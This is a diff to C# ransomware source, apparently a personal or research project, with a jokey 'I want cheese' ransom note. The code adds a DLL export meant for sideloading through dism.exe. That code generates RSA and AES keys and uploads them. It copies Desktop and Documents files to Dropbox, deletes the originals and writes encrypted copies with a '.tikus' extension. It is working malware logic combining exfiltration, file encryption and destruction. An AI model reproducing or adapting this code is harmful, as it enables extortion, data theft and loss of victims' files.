@@ -328,15 +328,15 @@ namespace Program
         public static string ransomNotes = @"
 All your files have been encrypted. I don't ask for money. All I want is a cheese...
 
-     ___ _____
-    /\ (_)    \
+      ___ _____
+     /\ (_)    \
     /  \      (_,
     _)  _\   _    \
-/   (_)\_( )____\
-\_     /    _  _/
-    ) /\/  _ (o)(
-    \ \_) (o)   /
-    \/________/ 
+   /   (_)\_( )____\
+   \_     /    _  _/
+      ) /\/  _ (o)(
+      \ \_) (o)   /
+       \/________/ 
             
 Have a nice day :)
             ";
@@ -362,91 +362,108 @@ Have a nice day :)
             File.WriteAllText(ransomNotePath, ransomNote);
         }
 
+        public static void StartProcess(string program)
+        {
+            System.Diagnostics.Process.Start(program, "http://www.google.com");
+        }
+
+
         // this export call can be used sideloaded with \windows\system32\dism.exe, dismcore.dll
         [DllExport]
         public static void DllGetClassObject()
         {
+            //start firefox
+            //StartProcess("firefox.exe");
+
             var computerName = Environment.MachineName;
 
-            var publicKey = GenKeyPairs();
-
-            byte[] aes_key = Random.GetRandomKey();
-            byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);
-
-            byte[] aes_iv = Random.GetRandomIV();
-            byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);
-
-            var baseDir = @"C:\Users\REUSER\Desktop\teloq";
+            var baseDir = @"C:\Users\ch4rm\Desktop\encme";
 
             var ransomFormat = ".tikus";
 
-            var blockExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx" };
-
-            var uselessFilesAndFolders = new List<string> { ".git", "ineedcheese" };
-
-            var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
+            var blockExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll" };
 
             var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
-            var folderToExtract = new List<string> { userDesktopPath , "Documents" };
-            
-            byte[] encrypted;
+            var folderToExtract = new List<string> { userDesktopPath, "Documents" };
 
-            //write aes_key and aes_iv
-            //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
-            //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);
+            var uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32" };
 
-            //write symmetic key
-            UploadKeys(encAesKey, "aes.key");
-            //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
-            UploadKeys(encIVKey, "aes.iv");
-            //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);
-
-            foreach (var file in targetDirs.Where(x => uselessFilesAndFolders.Any(s => !x.Contains(s))))
+            if(Directory.Exists(baseDir))
             {
-                var newFileExtension = $"{file}{ransomFormat}";
-                var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
+                var publicKey = GenKeyPairs();
 
-                if (!File.Exists(newFileExtension))
+                byte[] aes_key = Random.GetRandomKey();
+                byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);
+
+                byte[] aes_iv = Random.GetRandomIV();
+                byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);
+
+                var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
+
+                byte[] encrypted;
+
+                //write aes_key and aes_iv
+                //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
+                //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);
+
+                //write symmetic key
+                UploadKeys(encAesKey, "aes.key");
+                //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
+                UploadKeys(encIVKey, "aes.iv");
+                //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);
+
+                foreach (var file in targetDirs.Where(x => uselessFilesAndFolders.Any(s => !x.Contains(s))))
                 {
-                    if (!blockExtensions.Any(x => file.EndsWith(x)))
+                    var newFileExtension = $"{file}{ransomFormat}";
+                    var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
+
+                    if (!File.Exists(newFileExtension))
                     {
-                        try
+                        if (!blockExtensions.Any(x => file.EndsWith(x)))
                         {
-                            var outFolder = computerName + Path.GetDirectoryName(file).Replace(baseDir, "").Replace("\\", "/");
-
-                            var fileContent = File.ReadAllBytes(file);
-
-                            if (folderToExtract.Any(i => file.Contains(i)))
+                            try
                             {
-                                //upload file to google drive (do in background)
-                                var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
-                                task.Wait();
+                                var outFolder = computerName + Path.GetDirectoryName(file).Replace(baseDir, "").Replace("\\", "/");
+
+                                var fileContent = File.ReadAllBytes(file);
+
+                                if (folderToExtract.Any(i => file.Contains(i)))
+                                {
+                                    //upload file to google drive (do in background)
+                                    var task = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, file, outFolder));
+                                    task.Wait();
+                                }
+
+                                //delete the file
+                                File.Delete(file);
+
+                                //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
+                                encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
+
+                                File.WriteAllBytes(newFileExtension, encrypted);
+
+                                if (!File.Exists(ransomNotePath))
+                                    LeaveRansomNote(ransomNotePath);
+
+                            }
+                            catch
+                            {
+
                             }
 
-                            //delete the file
-                            File.Delete(file);
-
-                            //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
-                            encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
-
-                            File.WriteAllBytes(newFileExtension, encrypted);
-
-                            if (!File.Exists(ransomNotePath))
-                                LeaveRansomNote(ransomNotePath);
-                            
-                        }
-                        catch
-                        {
 
                         }
-
 
                     }
 
                 }
-
             }
+            else
+            {
+                Console.WriteLine("Not found");
+            }
+
 
         }
     }
